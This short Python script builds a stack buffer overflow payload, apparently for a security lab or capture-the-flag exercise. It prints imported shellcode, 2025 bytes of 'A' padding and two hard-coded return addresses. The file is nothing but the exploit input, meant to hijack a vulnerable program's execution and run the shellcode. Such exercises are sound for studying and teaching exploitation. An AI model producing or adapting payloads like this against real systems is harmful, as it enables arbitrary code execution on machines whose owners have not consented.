#!/usr/bin/python

from shellcode import shellcode
print (shellcode+"A"*2025+"\x08\xae\xfe\xbf"+"\x1c\xb6\xfe\xbf")
